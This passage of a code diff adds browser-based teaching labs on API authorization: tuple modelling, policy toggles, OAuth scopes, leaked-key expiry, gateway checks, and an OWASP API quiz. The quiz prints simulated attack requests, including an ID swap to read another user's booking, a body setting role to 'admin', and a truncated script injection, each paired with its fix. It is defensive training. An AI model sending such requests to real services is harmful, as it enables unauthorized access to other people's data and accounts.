+        resultBox.appendChild(h.badge('🏆 All green in ' + tuples.length + ' tuples — at or under par!', 'ok'));
+        log.add('ok', 'All 4 checks satisfied with ' + tuples.length + ' tuples (par ' + PAR + '). Fewest tuples wins.');
+      } else if (passAll) {
+        resultBox.appendChild(h.badge('All green, but ' + tuples.length + ' tuples — par is ' + PAR + '. Lean on groups + inheritance.', 'warn'));
+        log.add('warn', 'Correct but ' + (tuples.length - PAR) + ' over par — some grants are redundant.');
+      } else {
+        resultBox.appendChild(h.badge('Not there yet — some checks disagree.', 'bad'));
+        log.add('bad', 'Run failed — adjust your tuples. Remember owner⇒editor⇒viewer and folder viewer ⇒ doc viewer.');
+      }
+    }
+
+    root.appendChild(h.row([
+      h.col([
+        h.panel('The model (fixed)', [
+          h.note('folder:q3 —parent→ doc:report · owner⇒editor⇒viewer · a folder viewer is a viewer of its docs · group:finance#member is a usable subject.')
+        ]),
+        h.panel('Author a tuple', [
+          h.row([h.field('subject', subj), h.field('relation', rel), h.field('object', obj)]),
+          h.button('+ Add tuple', 'primary', addTuple)
+        ]),
+        h.panel('Tuples you have written', [listBox])
+      ]),
+      h.col([
+        h.panel('Required checks (Sam must FAIL)', [
+          h.button('▶ Run checks', 'primary', runChecks), resultBox
+        ])
+      ])
+    ]));
+    root.appendChild(h.panel('Event log', [log.root]));
+    renderList();
+    log.add('info', 'Goal: make all four checks correct with the fewest tuples. Par is 3.');
+  }
+});
+
+/* lab-opa | lesson: az3-opa */
+AcadLabs.register('lab-opa', {
+  title: 'Ship a policy, not a deploy',
+  blurb: 'Toggle Rego-flavored rules, re-evaluate the same 7 requests, and see each decision diff against the previous version — policy changes are testable, not redeploys.',
+  render: function (root, h) {
+    var log = h.logPanel();
+    var version = 0;
+    var prev = null; // previous decisions, keyed by request id
+
+    var rules = {
+      r1: { on: true, text: "allow if user.department == resource.department", kind: 'allow' },
+      r2: { on: true, text: "deny if request.time outside 06:00–22:00", kind: 'deny' },
+      r3: { on: true, text: "allow if user.role == 'admin'", kind: 'allow' },
+      r4: { on: true, text: "deny if resource.classification == 'restricted' and !user.clearance", kind: 'deny' },
+      r5: { on: true, text: "deny if user.contractor == true", kind: 'deny' }
+    };
+
+    var reqs = [
+      { id: 'q1', who: 'Priya reads a finance doc', user: { department: 'finance', role: 'analyst', clearance: false, contractor: false }, resource: { department: 'finance', classification: 'internal' }, request: { time: '10:00', action: 'read' } },
+      { id: 'q2', who: 'Priya reads a RESTRICTED finance doc', user: { department: 'finance', role: 'analyst', clearance: false, contractor: false }, resource: { department: 'finance', classification: 'restricted' }, request: { time: '10:00', action: 'read' } },
+      { id: 'q3', who: 'Zara (admin, cleared) reads restricted', user: { department: 'security', role: 'admin', clearance: true, contractor: false }, resource: { department: 'finance', classification: 'restricted' }, request: { time: '10:00', action: 'read' } },
+      { id: 'q4', who: 'Sam (partner) reads a finance doc', user: { department: 'partners', role: 'analyst', clearance: false, contractor: false }, resource: { department: 'finance', classification: 'internal' }, request: { time: '10:00', action: 'read' } },
+      { id: 'q5', who: 'Priya edits a finance doc at 23:30', user: { department: 'finance', role: 'analyst', clearance: false, contractor: false }, resource: { department: 'finance', classification: 'internal' }, request: { time: '23:30', action: 'write' } },
+      { id: 'q6', who: 'Bot A (contractor) writes finance doc', user: { department: 'finance', role: 'bot', clearance: false, contractor: true }, resource: { department: 'finance', classification: 'internal' }, request: { time: '11:00', action: 'write' } },
+      { id: 'q7', who: 'Kai reads a finance doc at 03:00', user: { department: 'finance', role: 'agent', clearance: false, contractor: false }, resource: { department: 'finance', classification: 'internal' }, request: { time: '03:00', action: 'read' } }
+    ];
+
+    function inHours(t) { return t >= '06:00' && t <= '22:00'; }
+
+    function evaluate(req) {
+      var allow = false, fired = 'default deny (no allow rule matched)';
+      if (rules.r1.on && req.user.department === req.resource.department) { allow = true; fired = 'r1 allow (department match)'; }
+      if (rules.r3.on && req.user.role === 'admin') { allow = true; fired = 'r3 allow (admin)'; }
+      // deny rules override (deny wins)
+      if (rules.r2.on && !inHours(req.request.time)) { allow = false; fired = 'r2 deny (outside 06:00–22:00)'; }
+      if (rules.r4.on && req.resource.classification === 'restricted' && !req.user.clearance) { allow = false; fired = 'r4 deny (restricted, no clearance)'; }
+      if (rules.r5.on && req.user.contractor === true) { allow = false; fired = 'r5 deny (contractor)'; }
+      return { decision: allow ? 'ALLOW' : 'DENY', fired: fired };
+    }
+
+    var out = h.el('div', {});
+    var jsonBox = h.el('div', {});
+
+    function runAll() {
+      version += 1;
+      out.innerHTML = '';
+      out.appendChild(h.el('div', { class: 'acad-lab-panel-title' }, 'Decisions · policy v' + version));
+      var cur = {};
+      reqs.forEach(function (req) {
+        var r = evaluate(req);
+        cur[req.id] = r.decision;
+        var kind = r.decision === 'ALLOW' ? 'ok' : 'bad';
+        var rowKids = [h.badge(r.decision, kind), h.note(req.who + ' — ' + r.fired)];
+        if (prev && prev[req.id] && prev[req.id] !== r.decision) {
+          rowKids.splice(1, 0, h.badge('changed: ' + prev[req.id] + '→' + r.decision + ' ⚠', 'warn'));
+        }
+        out.appendChild(h.row(rowKids));
+        log.add(r.decision === 'ALLOW' ? 'ok' : 'bad', 'v' + version + ' · ' + req.id + ' → ' + r.decision + ' [' + r.fired + ']');
+      });
+      if (prev) log.add('info', 'v' + (version - 1) + ' → v' + version + ' diffed: policy is versioned and testable — no redeploy.');
+      prev = cur;
+      h.flash(out);
+    }
+
+    function ruleToggle(key) {
+      var rr = rules[key];
+      return h.chip(key.toUpperCase() + ' · ' + rr.text, rr.on, function (on) {
+        rr.on = on;
+        log.add('info', key.toUpperCase() + ' ' + (on ? 'enabled' : 'disabled') + ' — edit the file, not the app.');
+      });
+    }
+
+    root.appendChild(h.row([
+      h.col([
+        h.panel('policy.rego (toggle rules = edit the file)', [
+          ruleToggle('r1'), ruleToggle('r2'), ruleToggle('r3'), ruleToggle('r4'), ruleToggle('r5'),
+          h.note('Deny wins over allow; default is deny. Toggling a rule is a code change you can review and roll back.')
+        ]),
+        h.panel('The 7 incoming requests', [
+          h.button('Show requests (JSON)', 'ghost', function () {
+            jsonBox.innerHTML = ''; jsonBox.appendChild(h.jsonView(reqs)); h.flash(jsonBox);
+          }), jsonBox
+        ])
+      ]),
+      h.col([
+        h.panel('Evaluate', [
+          h.button('▶ Evaluate policy', 'primary', runAll),
+          h.note('First run = v1 (baseline). Toggle a rule, evaluate again, and the diff column shows what your change flipped.'),
+          out
+        ])
+      ])
+    ]));
+    root.appendChild(h.panel('Decision log (the audit trail)', [log.root]));
+    log.add('info', 'PDP ready. Same requests every run; only the versioned policy changes.');
+  }
+});
+
+/* lab-scopes | lesson: az4-scopes */
+AcadLabs.register('lab-scopes', {
+  title: 'Design the consent screen',
+  blurb: 'A partner app must read Maya’s bookings and make ONE payment — pick a scope set, survive Maya’s consent screen, then watch the API calls 200 or 403.',
+  render: function (root, h) {
+    var log = h.logPanel();
+    var NEEDED = ['bookings:read', 'payments:charge'];
+    var CATALOG = ['bookings:read', 'bookings:write', 'payments:charge', 'payments:read', 'profile:read', 'profile:write', 'contacts:read', 'admin:*'];
+    var selected = {};
+    var granted = null; // array of granted scopes once consent succeeds
+
+    var meter = h.meter(0, 'warn');
+    var reaction = h.el('div', {});
+    var apiOut = h.el('div', {});
+    var rarBox = h.el('div', {});
+
+    function chipRow() {
+      var wrap = h.el('div', { class: 'acad-lab-row' });
+      CATALOG.forEach(function (s) {
+        wrap.appendChild(h.chip(s, false, function (on) {
+          if (on) selected[s] = true; else delete selected[s];
+        }));
+      });
+      return wrap;
+    }
+
+    function selList() { return Object.keys(selected); }
+
+    function requestConsent() {
+      var picked = selList();
+      reaction.innerHTML = ''; apiOut.innerHTML = ''; granted = null;
+      if (!picked.length) {
+        reaction.appendChild(h.badge('Nothing requested', 'warn'));
+        reaction.appendChild(h.note('Select at least the scopes the app needs, then request consent.'));
+        return;
+      }
+      if (selected['admin:*']) {
+        meter.set(0, 'bad');
+        reaction.appendChild(h.badge('⛔ Maya alarmed — admin:* on a bookings app?!', 'bad'));
+        reaction.appendChild(h.note('A wildcard admin scope on a travel integration is a red flag. Maya declines and reports the app.'));
+        log.add('bad', 'Consent requested with admin:* → Maya declined hard. Never ask for the keys to the kingdom.');
+        return;
+      }
+      var extra = picked.filter(function (s) { return NEEDED.indexOf(s) < 0; }).length;
+      var conv = Math.max(0, 100 - 25 * extra);
+      var accepted = conv >= 60;
+      meter.set(conv, accepted ? 'ok' : 'bad');
+      if (accepted) {
+        granted = picked.slice();
+        reaction.appendChild(h.badge('✅ Consent granted · conversion ' + conv + '%', 'ok'));
+        reaction.appendChild(h.note('Maya recognized every scope and tapped Allow. Now run the app’s API calls.'));
+        log.add('ok', 'Maya granted [' + picked.join(', ') + '] · conversion ' + conv + '%');
+      } else {
+        reaction.appendChild(h.badge('⚠️ Maya declined · conversion ' + conv + '%', 'warn'));
+        reaction.appendChild(h.note('Too greedy — ' + extra + ' scope(s) the app does not need. Maya frowns and taps Deny. Ask for less.'));
+        log.add('warn', 'Greedy request ([' + picked.join(', ') + ']) → Maya declined. Extra scopes tank conversion.');
+      }
+    }
+
+    function call(method, path, need) {
+      var ok = granted && granted.indexOf(need) > -1;
+      if (ok) {
+        return h.httpCard({ method: method, path: path, status: 200,
+          resBody: method === 'GET' ? { bookings: [{ id: 'bk-4411', city: 'Lisbon' }] } : { payment: 'pay-' + h.rand(4), status: 'charged', amount: '$50.00' },
+          note: 'Token carries ' + need + ' — the API is satisfied.' });
+      }
+      return h.httpCard({ method: method, path: path, status: 403,
+        statusText: 'Forbidden', resBody: { error: 'insufficient_scope', scope: need },
+        note: 'WWW-Authenticate: Bearer error="insufficient_scope", scope="' + need + '" — the token lacks it.' });
+    }
+
+    function runCalls() {
+      apiOut.innerHTML = '';
+      if (!granted) { apiOut.appendChild(h.note('No consent yet — request consent first.')); return; }
+      var c1 = call('GET', '/bookings', 'bookings:read');
+      var c2 = call('POST', '/payments', 'payments:charge');
+      apiOut.appendChild(c1); apiOut.appendChild(c2);
+      var win = granted.indexOf('bookings:read') > -1 && granted.indexOf('payments:charge') > -1;
+      var minimal = granted.length === 2 && win;
+      if (minimal) {
+        apiOut.appendChild(h.badge('🏆 Minimal set — consent granted AND every call passes. Least privilege by design.', 'ok'));
+        log.add('ok', 'GET /bookings 200 · POST /payments 200 — minimal set {bookings:read, payments:charge}. Perfect.');
+      } else if (win) {
+        apiOut.appendChild(h.badge('All calls pass, but you over-asked — trim to the two you need.', 'warn'));
+        log.add('warn', 'Calls pass but scope set is broader than needed.');
+      } else {
+        apiOut.appendChild(h.badge('A call 403’d — a needed scope is missing from consent.', 'bad'));
+        log.add('bad', 'insufficient_scope on a required call — the app cannot do its job.');
+      }
+    }
+
+    function showRar() {
+      rarBox.innerHTML = '';
+      rarBox.appendChild(h.note('RFC 9396 — instead of a blunt payments:charge scope, request exactly one bounded action:'));
+      rarBox.appendChild(h.jsonView({ authorization_details: [{ type: 'payment_initiation', actions: ['initiate'], amount: { currency: 'USD', max: '50.00' }, creditorAccount: { id: 'acct-8842' } }] }));
+      log.add('info', 'RAR: “transfer up to $50 to acct-8842, once” — least privilege taken to its logical end.');
+    }
+
+    root.appendChild(h.row([
+      h.col([
+        h.panel('Scope catalog (the app needs: bookings:read + payments:charge)', [
+          chipRow(),
+          h.row([
+            h.button('Request consent →', 'primary', requestConsent),
+            h.button('Run the app’s API calls', 'ghost', runCalls)
+          ])
+        ]),
+        h.panel('Beyond scopes', [
+          h.button('Use RFC 9396 RAR instead', 'ghost', showRar), rarBox
+        ])
+      ]),
+      h.col([
+        h.panel('Maya’s consent screen', [meter.root, reaction]),
+        h.panel('API responses', [apiOut])
+      ])
+    ]));
+    root.appendChild(h.panel('Event log', [log.root]));
+    log.add('info', 'Design the permission surface: ask for the fewest scopes that get the job done.');
+  }
+});
+
+/* lab-apikeys | lesson: az5-apikeys */
+AcadLabs.register('lab-apikeys', {
+  title: 'Leak week',
+  blurb: 'Leak a static API key and a 5-minute token in the same breath, then let the attacker try them at hour 1 and day 30 — and watch the blast radii diverge.',
+  render: function (root, h) {
+    var st = { leaked: false, keyRotated: false, clientRevoked: false, keyDmg: 0, tokenDmg: 0 };
+    var CLIENT = 'bot-a';
+    var log = h.logPanel();
+    var keyBox = h.stage(h.note('The static-key column reports here.'));
+    var tokBox = h.stage(h.note('The 5-min-token column reports here.'));
+    var keyMeter = h.meter(0, 'bad');
+    var tokMeter = h.meter(0, 'ok');
+    var punch = h.el('div', {});
+
+    function showKey(node) { keyBox.innerHTML = ''; keyBox.appendChild(node); h.flash(keyBox); }
+    function showTok(node) { tokBox.innerHTML = ''; tokBox.appendChild(node); h.flash(tokBox); }
+
+    function refresh() {
+      keyMeter.set(Math.min(100, st.keyDmg * 25), 'bad');
+      tokMeter.set(Math.min(100, st.tokenDmg * 25), st.tokenDmg ? 'bad' : 'ok');
+      punch.innerHTML = '';
+      punch.appendChild(h.badge('Static key · ' + st.keyDmg + ' successful attacker call(s)', st.keyDmg ? 'bad' : 'neutral'));
+      punch.appendChild(h.badge('5-min token · ' + st.tokenDmg + ' successful attacker call(s)', st.tokenDmg ? 'bad' : 'ok'));
+    }
+
+    function leak() {
+      st.leaked = true;
+      log.add('warn', 'Day 1 · both credentials pasted into a public repo — an immortal key AND a live 5-min token exposed.');
+      showKey(h.httpCard({ method: 'GET', path: '/billing (with X-Api-Key)', status: 200,
+        resBody: { note: 'key captured — no expiry, no owner recorded' }, note: 'The copy is now permanent until a human rotates it.' }));
+      showTok(h.httpCard({ method: 'GET', path: '/billing (Bearer token)', status: 200,
+        resBody: { client_id: CLIENT, exp_in: '5 min' }, note: 'Token captured — but it starts a 5-minute countdown.' }));
+      refresh();
+    }
+
+    function attack(mins, label) {
+      if (!st.leaked) { showKey(h.note('Leak the credentials first.')); return; }
+      log.add('bad', 'Attacker replays both stolen credentials · ' + label + '.');
+      if (st.keyRotated) {
+        showKey(h.httpCard({ method: 'GET', path: '/billing', status: 401,
+          resBody: { error: 'invalid_key' }, note: 'Old key finally dead — but only because someone rotated it by hand.' }));
+      } else {
+        st.keyDmg++;
+        showKey(h.httpCard({ method: 'GET', path: '/billing', status: 200,
+          resBody: { invoices: [{ id: 'inv-118', total: '$50.00' }] },
+          note: 'Still 200 OK ' + label + ' after the leak. The log cannot even say who called.' }));
+      }
+      if (st.clientRevoked) {
+        showTok(h.httpCard({ method: 'GET', path: '/billing', status: 401,
+          resBody: { error: 'invalid_token', reason: 'client_revoked' }, note: 'client_id=' + CLIENT + ' revoked centrally — instant.' }));
+      } else if (mins > 5) {
+        showTok(h.httpCard({ method: 'GET', path: '/billing', status: 401,
+          resBody: { error: 'invalid_token', reason: 'token_expired' },
+          note: 'Captured token expired 5 min after issue; ' + label + ' it is long dead. Decision log: client_id=' + CLIENT + ' → denied.' }));
+      } else {
+        st.tokenDmg++;
+        showTok(h.httpCard({ method: 'GET', path: '/billing', status: 200, note: 'Inside the 5-min window — but the window is closing.' }));
+      }
+      refresh();
+    }
+
+    function rotate() {
+      if (!st.leaked) { showKey(h.note('Nothing to rotate yet.')); return; }
+      st.keyRotated = true; st.clientRevoked = true;
+      log.add('ok', 'You rotate the key AND revoke the client. Note the effort gap.');
+      showKey(h.httpCard({ method: 'POST', path: '/rotate-key', status: 200,
+        note: 'Fire drill: EVERY legitimate caller must be updated at once or they break too.' }));
+      showTok(h.httpCard({ method: 'POST', path: '/revoke-client', status: 200,
+        resBody: { client_id: CLIENT, status: 'revoked' }, note: 'One switch at the authorization server — done.' }));
+      refresh();
+    }
+
+    root.appendChild(h.panel('Timeline (run them in order)', [
+      h.button('Day 1 · credential leaks to a public repo', 'danger', leak),
+      h.button('Attacker tries it · hour 1', 'ghost', function () { attack(60, 'hour 1'); }),
+      h.button('Attacker tries it · day 30', 'ghost', function () { attack(43200, 'day 30'); }),
+      h.button('You rotate the key / revoke the client', 'primary', rotate),
+      h.note('The attacker always strikes long after the leak — so expiry is what decides who wins.')
+    ]));
+    root.appendChild(h.row([
+      h.col([h.panel('Static API key', [keyMeter.root, keyBox])]),
+      h.col([h.panel('OAuth client + 5-min tokens', [tokMeter.root, tokBox])])
+    ]));
+    root.appendChild(h.panel('Blast radius', [punch]));
+    root.appendChild(h.panel('Event log', [log.root]));
+    refresh();
+    log.add('info', 'Same leak, two credentials. Press "Day 1" to start the week.');
+  }
+});
+
+/* lab-gateway | lesson: az6-gateway */
+AcadLabs.register('lab-gateway', {
+  title: 'You are the gateway',
+  blurb: 'Toggle the enforcement layers on your API gateway, fire a fixed traffic batch through the CURRENT config, and count how much junk still reaches your backend.',
+  render: function (root, h) {
+    var cfg = { verify: false, aud: false, scope: false, rate: false, schema: false };
+    var LIMIT = 5;
+    var log = h.logPanel();
+    var out = h.stage(h.note('Flip some layers on, then send the traffic burst.'));
+    var backendMeter = h.meter(100, 'bad');
+    var quotaMeter = h.meter(0, 'ok');
+
+    // greedy-bot has already made 4 calls this minute (runaway agent) before the batch.
+    var BATCH = [
+      { client: 'maya-app', method: 'GET', path: '/bookings/1001', flaw: 'none', desc: 'valid, correct scope' },
+      { client: 'maya-app', method: 'GET', path: '/bookings', flaw: 'expired', desc: 'JWT expired' },
+      { client: 'partner', method: 'GET', path: '/bookings', flaw: 'aud', desc: 'aud = other-api' },
+      { client: 'partner', method: 'POST', path: '/bookings', flaw: 'scope', desc: 'has read, needs write' },
+      { client: 'maya-app', method: 'POST', path: '/bookings', flaw: 'body', desc: 'malformed body' },
+      { client: 'greedy-bot', method: 'GET', path: '/bookings/2001', flaw: 'burst', desc: 'burst 1/4' },
+      { client: 'greedy-bot', method: 'GET', path: '/bookings/2002', flaw: 'burst', desc: 'burst 2/4' },
+      { client: 'greedy-bot', method: 'GET', path: '/bookings/2003', flaw: 'burst', desc: 'burst 3/4' },
+      { client: 'greedy-bot', method: 'GET', path: '/bookings/2004', flaw: 'burst', desc: 'burst 4/4' }
+    ];
+
+    function evaluate(req, counter) {
+      if (cfg.rate) {
+        counter[req.client] = (counter[req.client] || 0) + 1;
+        if (counter[req.client] > LIMIT) return { s: 429, e: 'rate_limited', retry: '30', why: req.client + ' over ' + LIMIT + '/min' };
+      }
+      if (req.flaw === 'expired' && cfg.verify) return { s: 401, e: 'invalid_token', why: 'signature/exp check failed' };
+      if (req.flaw === 'aud' && cfg.aud) return { s: 401, e: 'invalid_token', why: 'audience mismatch' };
+      if (req.flaw === 'scope' && cfg.scope) return { s: 403, e: 'insufficient_scope', why: 'needs bookings:write' };
+      if (req.flaw === 'body' && cfg.schema) return { s: 400, e: 'bad_request', why: 'schema validation failed' };
+      return { s: 200, why: req.flaw === 'burst' ? 'within quota' : 'passed all enabled checks' };
+    }
+
+    function send() {
+      out.innerHTML = '';
+      var counter = { 'greedy-bot': 4 }; // prior traffic this minute
+      var backend = 0;
+      log.add('info', 'Traffic batch sent through config: ' + summary() + '.');
+      BATCH.forEach(function (req) {
+        var r = evaluate(req, counter);
+        if (r.s === 200) backend++;
+        out.appendChild(h.httpCard({
+          method: req.method, path: req.path + '  [' + req.client + ' · ' + req.desc + ']',
+          status: r.s, statusText: r.s === 429 ? 'Too Many Requests' : null,
+          resBody: r.e ? (r.retry ? { error: r.e, Retry_After: r.retry } : { error: r.e }) : { ok: true },
+          note: r.why
+        }));
+      });
+      backendMeter.set(Math.round(backend / BATCH.length * 100), backend > 2 ? 'bad' : 'ok');
+      var g = counter['greedy-bot'] || 4;
+      quotaMeter.set(Math.min(100, Math.round(g / LIMIT * 100)), g > LIMIT ? 'bad' : 'warn');
+      log.add(backend > 2 ? 'bad' : 'ok', backend + ' of ' + BATCH.length + ' requests reached the backend (2 are genuinely legit).');
+      out.insertBefore(h.badge(backend + ' / ' + BATCH.length + ' reached your backend', backend > 2 ? 'bad' : 'ok'), out.firstChild);
+      h.flash(out);
+    }
+
+    function summary() {
+      var on = [];
+      if (cfg.verify) on.push('verify'); if (cfg.aud) on.push('aud'); if (cfg.scope) on.push('scope');
+      if (cfg.rate) on.push('rate'); if (cfg.schema) on.push('schema');
+      return on.length ? on.join('+') : 'ALL OFF';
+    }
+
+    root.appendChild(h.row([
+      h.col([h.panel('Gateway config (toggle, then re-send)', [
+        h.chip('Verify JWT (sig/exp)', false, function (v) { cfg.verify = v; }),
+        h.chip('Check audience', false, function (v) { cfg.aud = v; }),
+        h.chip('Enforce scopes', false, function (v) { cfg.scope = v; }),
+        h.chip('Rate limit 5/min', false, function (v) { cfg.rate = v; }),
+        h.chip('Schema validation', false, function (v) { cfg.schema = v; }),
+        h.button('Send traffic burst →', 'primary', send),
+        h.note('greedy-bot already made 4 calls this minute — its 4-request burst pushes it over 5/min.')
+      ])]),
+      h.col([
+        h.panel('Reaching your backend', [backendMeter.root, h.note('Everything off: all junk lands. Fully armed: only the 2 legit calls pass.')]),
+        h.panel('greedy-bot quota (of 5/min)', [quotaMeter.root])
+      ])
+    ]));
+    root.appendChild(h.panel('Per-request verdicts', out));
+    root.appendChild(h.panel('Event log', [log.root]));
+    backendMeter.set(0, 'ok');
+    log.add('info', 'Gateway is the PEP: it decides every request before your services do. Start with all layers off.');
+  }
+});
+
+/* lab-owasp | lesson: az7-owasp */
+AcadLabs.register('lab-owasp', {
+  title: 'Spot the break-in',
+  blurb: 'Six requests hit the pilates-booking API — each hides one OWASP API sin. Name the vulnerability, learn the fix, and earn your rank.',
+  render: function (root, h) {
+    var idx = 0, score = 0;
+    var stage = h.stage();
+    var opts = ['BOLA (object ownership)', 'Mass assignment (BOPLA)', 'Broken function level authz (BFLA)', 'Excessive data exposure', 'No rate limiting', 'Unsafe third-party consumption'];
+
+    var rounds = [
+      { req: { method: 'GET', path: '/bookings/1002', reqBody: { as: 'maya (valid token)' }, status: 200, resBody: { id: 1002, owner: 'sam', phone: '555-0142' } },
+        correct: 'BOLA (object ownership)', fix: 'Maya read Sam’s booking by swapping the ID. Fix: a per-object ownership check on every request (az7 / az2-rebac).' },
+      { req: { method: 'PATCH', path: '/users/me', reqBody: { name: 'Maya', role: 'admin' }, status: 200, resBody: { name: 'Maya', role: 'admin' } },
+        correct: 'Mass assignment (BOPLA)', fix: 'The body set role=admin and the API bound it blindly. Fix: allow-list writable properties server-side (az7 / az3-opa).' },
+      { req: { method: 'GET', path: '/admin/refunds', reqBody: { as: 'normal user token' }, status: 200, resBody: { refunds: ['$40', '$120'] } },
+        correct: 'Broken function level authz (BFLA)', fix: 'A normal user hit an admin route the UI merely hid. Fix: server-side role check on every privileged function (az7 / az1-models).' },
+      { req: { method: 'GET', path: '/bookings/1001', status: 200, resBody: { id: 1001, owner: 'maya', passwordHash: 'a1b2...', ssn: '***-**-1234' } },
+        correct: 'Excessive data exposure', fix: 'The response leaked password hash and SSN. Fix: return only the fields the client needs; never dump the whole record.' },
+      { req: { method: 'GET', path: '/search?q=class', reqBody: { note: '10,000 requests/min from one API key' }, status: 200, resBody: { results: '...' } },
+        correct: 'No rate limiting', fix: 'One key fired 10k req/min unthrottled. Fix: per-client rate limits and quotas at the gateway → 429 (az7 / az6-gateway).' },
+      { req: { method: 'POST', path: '/import-calendar', reqBody: { from: 'partner-api (unvalidated)', html: '<script>...' }, status: 200, resBody: { imported: true } },
+        correct: 'Unsafe third-party consumption', fix: 'Your API piped a partner’s response straight in. Fix: validate and bound upstream data like any untrusted input (az7 / az6-gateway).' }
+    ];
+
+    function rank(n) {
+      if (n >= 6) return 'Script kiddie’s nightmare';
+      if (n >= 4) return 'Blue-team ready';
+      if (n >= 2) return 'Still patching in prod';
+      return 'Shipped on a Friday';
+    }
+
+    function shuffleOptions(correct) {
+      var pool = opts.slice();
+      var choices = [correct];
+      // walk the pool from a per-round offset, taking distinct distractors
+      for (var i = 0; i < pool.length && choices.length < 4; i++) {
+        var pick = pool[(i + idx * 2) % pool.length];
+        if (choices.indexOf(pick) < 0) choices.push(pick);
+      }
+      // deterministic rotation so the correct one is not always first
+      var rot = idx % 4;
+      return choices.slice(rot).concat(choices.slice(0, rot));
+    }
+
+    function renderRound() {
+      stage.innerHTML = '';
+      if (idx >= rounds.length) {
+        stage.appendChild(h.panel('Final score', [
+          h.badge(score + ' / ' + rounds.length + ' correct', score >= 4 ? 'ok' : (score >= 2 ? 'warn' : 'bad')),
+          h.badge('Rank: ' + rank(score), 'info'),
+          h.button('Play again', 'primary', function () { idx = 0; score = 0; renderRound(); })
+        ]));
+        h.flash(stage);
+        return;
+      }
+      var r = rounds[idx];
+      stage.appendChild(h.el('div', {}, [
+        h.badge('Round ' + (idx + 1) + ' / ' + rounds.length + ' · score ' + score, 'neutral'),
+        h.httpCard(r.req)
+      ]));
+      var fb = h.el('div', {});
+      var btns = shuffleOptions(r.correct).map(function (label) {
+        return h.button(label, 'ghost', function () {
+          var ok = label === r.correct;
+          if (ok) score++;
+          fb.innerHTML = '';
+          fb.appendChild(h.badge(ok ? '✅ ' + r.correct : '❌ It was: ' + r.correct, ok ? 'ok' : 'bad'));
+          fb.appendChild(h.note(r.fix));
+          fb.appendChild(h.button('Next →', 'primary', function () { idx++; renderRound(); }));
+          h.flash(fb);
+        });
+      });
+      stage.appendChild(h.panel('Which OWASP API risk is this?', btns));
+      stage.appendChild(fb);
+      h.flash(stage);
+    }
+
+    root.appendChild(stage);
+    renderRound();
+  }
+});
